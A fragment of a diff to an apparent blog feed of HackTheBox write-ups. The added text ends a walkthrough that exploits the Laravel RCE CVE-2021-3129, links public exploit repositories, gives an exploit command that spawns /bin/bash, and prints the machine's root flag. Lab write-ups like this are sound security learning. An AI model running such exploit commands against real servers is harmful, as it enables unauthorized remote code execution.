+There is a PHAR deserialization CVE that allows RCE: CVE-2021-3129. &lt;a href=&#34;https://github.com/zhzyker/CVE-2021-3129&#34;&gt;https://github.com/zhzyker/CVE-2021-3129&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;9- &lt;code&gt;python3 exp.py http://localhost:8000/ &amp;quot;system(&#39;/bin/bash&#39;);&amp;quot;&lt;/code&gt; but change exp.py with &lt;a href=&#34;https://github.com/crisprss/Laravel_CVE-2021-3129_EXP&#34;&gt;https://github.com/crisprss/Laravel_CVE-2021-3129_EXP&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;root.txt: 095ff8dc5f20b8e1aef209106c989d0c&lt;/p&gt;
+
+  &lt;/div&gt;
+&lt;/div&gt;
+
 </content>
     </item>
     
     <item>
-      <title>Bounty Hunter</title>
+      <title>Bounty Hunter - HackTheBox machine</title>
       <link>/labs/bounty_hunter/</link>
       <pubDate>Tue, 07 Sep 2021 12:36:57 +0200</pubDate>
       
